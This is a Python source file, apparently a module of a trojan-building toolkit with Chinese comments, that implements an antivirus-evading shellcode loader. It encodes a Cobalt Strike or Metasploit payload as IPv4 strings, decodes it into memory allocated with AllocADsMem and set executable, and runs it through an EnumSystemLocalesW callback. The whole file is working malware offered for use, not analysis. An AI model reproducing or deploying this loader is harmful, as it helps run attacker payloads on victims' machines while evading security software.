import ctypes
import sys

info="ipv4加载器使用AllocADsMem+ReallocADsMem的内存申请方式，配合RtlIpv4StringToAddressW这个函数，可以直接将ipv4格式的shellcode加载进内存，一定作用上规避杀毒软件检测，但本质上的作用shellcode加密类似，只是改变了加载时的shellcode，写入内存后的内容依然是还原的shellcode，所以效果有限。"

def main(shellcode):
    #定义main方法，最终生成的木马脚本需要从main方法开始执行，也可以定义其它方法从main中调用。所有自定义方法都会被写到最终的木马脚本
    if isinstance(shellcode,str):
        shellcode=shellcode.encode('latin1')    #确保buf是unicode，此处是为了兼容CS和MSF

    if len(shellcode) % 4 != 0:
        null_byte = b'\x00' * (4 - len(shellcode) % 4)
    shellcode += null_byte

    ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64
    ptr_alloc_1 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(shellcode) // 4 * 16))
    ctypes.windll.Activeds.ReallocADsMem.restype = ctypes.c_uint64
    ptr_realloc_1 = ctypes.windll.Activeds.ReallocADsMem(ctypes.c_uint64(ptr_alloc_1), len(shellcode) // 4 * 16, len(shellcode) // 4 * 16)
    ctypes.windll.kernel32.VirtualProtect(ctypes.c_uint64(ptr_realloc_1), ctypes.c_int(len(shellcode) // 4 * 16), 0x40, ctypes.byref(ctypes.c_long(1)))

    for i in range(len(shellcode) // 4):
        bytes_shellcode = shellcode[i * 4: 4 + i * 4]
        ctypes.windll.Ntdll.RtlIpv4AddressToStringA(bytes_shellcode, ctypes.c_uint64(ptr_realloc_1 + i * 16))

    ipv4_list = []
    for i in range(len(shellcode) // 4):
        ipv4 = ctypes.string_at(ptr_realloc_1 + i * 16, 16)
        ipv4=ipv4.decode('latin1').strip('\x00')
        ipv4_list.append(ipv4)

    print(ipv4_list)
    ptr_alloc_2 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(shellcode)))
    ptr_realloc_2 = ctypes.windll.Activeds.ReallocADsMem(ctypes.c_uint64(ptr_alloc_2), ctypes.c_int(len(shellcode)), ctypes.c_int(len(shellcode)))
    ctypes.windll.kernel32.VirtualProtect(ctypes.c_uint64(ptr_realloc_2), ctypes.c_int(len(shellcode)), ctypes.c_int(0x40), ctypes.byref(ctypes.c_long(1)))

    rwxpage = ptr_realloc_2
    for i in range(len(ipv4_list)):

        ctypes.windll.Ntdll.RtlIpv4StringToAddressW(ipv4_list[i], ctypes.c_bool(False), ipv4_list[i], ctypes.c_uint64(rwxpage))
        rwxpage += 4

    ctypes.windll.kernel32.EnumSystemLocalesW(ctypes.c_uint64(ptr_realloc_2), 0)

if __name__ == '__main__':

    import shellcoder
    buf=shellcoder.main('','',r"C:\Users\d\Desktop\hack\payloadJQuery.py",'','',True)
    print('buf:\n',buf)

    if not buf:
        sys.exit()
    else:

        main(buf)